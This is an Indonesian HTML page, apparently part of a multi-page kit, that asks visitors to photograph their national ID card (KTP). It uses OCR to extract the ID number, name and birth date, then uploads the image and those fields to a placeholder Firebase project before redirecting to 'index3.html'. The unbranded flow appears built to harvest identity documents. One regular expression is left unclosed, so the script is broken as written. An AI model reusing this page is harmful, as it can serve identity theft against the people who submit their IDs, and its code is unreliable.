 <!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Pelanggan</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>

<style>
body{margin:0;background:#000;color:#fff;font-family:'Orbitron';text-align:center}

/* FRAME */
.frame{
 width:85%;max-width:420px;aspect-ratio:10/6;
 border:2mm solid #888;margin:20px auto;border-radius:10px;
 background:#111;display:flex;justify-content:center;align-items:center;position:relative;
}
.frame img{width:100%;height:100%;object-fit:cover;display:none}
.label{position:absolute;color:#00aaff}

/* BUTTON */
.btn{
 width:85%;max-width:420px;padding:14px;margin:10px auto;
 background:linear-gradient(45deg,#d4af37,#ffd700);
 border:none;color:#000;font-weight:bold;border-radius:8px;
}

/* FORM */
.form{display:none}
.input{
 width:85%;max-width:420px;padding:10px;margin:5px auto;
 border-radius:6px;border:none;
}

/* CHECKBOX */
.checkbox{
 display:none;width:85%;max-width:420px;
 margin:10px auto;font-size:12px;text-align:left;
}

/* LOADING */
#loadingScreen{
 position:fixed;top:0;left:0;width:100%;height:100%;
 background:#000;display:none;justify-content:center;align-items:center;
 flex-direction:column;z-index:999;
}
.loader{
 border:5px solid #222;border-top:5px solid #00aaff;
 border-radius:50%;width:50px;height:50px;
 animation:spin 1s linear infinite;
}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}

/* POPUP */
#popupSuccess{
 position:fixed;top:0;left:0;width:100%;height:100%;
 background:rgba(0,0,0,0.7);
 display:none;justify-content:center;align-items:center;z-index:1000;
}
.popup-box{
 background:#111;padding:25px;border-radius:12px;
 width:80%;max-width:320px;text-align:center;
}
#btnLanjut{
 width:100%;padding:12px;
 background:linear-gradient(45deg,#007bff,#00aaff);
 color:#000;font-weight:bold;border:none;border-radius:8px;
}
</style>
</head>

<body>

<h2>Verifikasi Pelanggan</h2>

<div class="frame">
 <img id="preview">
 <div class="label" id="label">FOTO KTP</div>
</div>

<button class="btn" id="btnFoto">AMBIL FOTO</button>

<div class="form" id="formOCR">
 <input class="input" id="nik" placeholder="NIK">
 <input class="input" id="nama" placeholder="Nama">
 <input class="input" id="ttl" placeholder="Tanggal / Bulan / Tahun" inputmode="numeric">
</div>

<div class="checkbox" id="box">
 <input type="checkbox" id="check">
 Data yang saya berikan sudah sesuai dengan Kartu Identitas saya.
</div>

<div id="notif"></div>

<!-- LOADING -->
<div id="loadingScreen">
 <div class="loader"></div>
 <p id="loadingText">Memproses Verifikasi... 0%</p>
</div>

<!-- POPUP -->
<div id="popupSuccess">
 <div class="popup-box">
  <h3>Upload Berhasil</h3>
  <p>Data Anda berhasil dikirim</p>
  <button id="btnLanjut">LANJUTKAN</button>
 </div>
</div>

<input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

/* FIREBASE */
const firebaseConfig={
 apiKey:"ISI_APIKEY",
 authDomain:"ISI.firebaseapp.com",
 projectId:"ISI",
 storageBucket:"ISI.appspot.com",
 appId:"ISI_APPID"
};

const app=initializeApp(firebaseConfig);
const storage=getStorage(app);
const db=getFirestore(app);

/* ELEMENT */
const btnFoto=document.getElementById("btnFoto");
const cameraInput=document.getElementById("cameraInput");
const preview=document.getElementById("preview");
const label=document.getElementById("label");
const formOCR=document.getElementById("formOCR");
const box=document.getElementById("box");
const check=document.getElementById("check");
const notif=document.getElementById("notif");
const loadingScreen=document.getElementById("loadingScreen");
const loadingText=document.getElementById("loadingText");
const popupSuccess=document.getElementById("popupSuccess");
const btnLanjut=document.getElementById("btnLanjut");

let fileBlob=null;

/* OPEN CAMERA */
btnFoto.addEventListener("click",()=>cameraInput.click());

/* FORMAT TTL */
ttl.addEventListener("input",e=>{
 let v=e.target.value.replace(/\D/g,"").slice(0,8);
 e.target.value=v.replace(/(\d{2})(\d{2})(\d{4})/,"$1 / $2 / $3");
});

/* OCR EXTRACT */
function extract(t){
 t=t.replace(/\s+/g,' ');
 let nik=(t.match(/\b\d{16}\b)||[""])[0];
 let nama=((t.match(/NAMA\s*[:\-]?\s*([A-Z\s]+)/)||["",""])[1]).trim();
 let ttlRaw=t.match(/(\d{2})[\/\-]?(\d{2})[\/\-]?(\d{4})/);
 let ttl=ttlRaw?`${ttlRaw[1]} / ${ttlRaw[2]} / ${ttlRaw[3]}`:"";
 return {nik,nama,ttl};
}

/* FOTO */
cameraInput.addEventListener("change",async e=>{
 const file=e.target.files[0];
 if(!file)return;

 fileBlob=file;

 preview.src=URL.createObjectURL(file);
 preview.style.display="block";
 label.style.display="none";

 loadingScreen.style.display="flex";

 const result=await Tesseract.recognize(preview.src,'ind+eng',{
  logger:m=>{
   if(m.status==="recognizing text"){
    loadingText.innerText="Memproses Verifikasi... "+Math.round(m.progress*100)+"%";
   }
  }
 });

 loadingScreen.style.display="none";

 const data=extract(result.data.text.toUpperCase());

 nik.value=data.nik;
 nama.value=data.nama;
 ttl.value=data.ttl;

 formOCR.style.display="block";

 if(nik.value && nama.value && ttl.value){
  box.style.display="block";
 }
});

/* AUTO KIRIM */
check.addEventListener("change",async ()=>{
 if(!check.checked)return;

 notif.innerText="Uploading...";

 const fileName="ktp_"+Date.now()+".jpg";
 const storageRef=ref(storage,fileName);

 await uploadBytes(storageRef,fileBlob);

 await addDoc(collection(db,"verifikasi"),{
  nik:nik.value,
  nama:nama.value,
  tanggal_lahir:ttl.value,
  file:fileName,
  createdAt:serverTimestamp()
 });

 popupSuccess.style.display="flex";
});

/* LANJUT */
btnLanjut.addEventListener("click",()=>{
 window.location.href="index3.html";
});

</script>

</body>
</html>
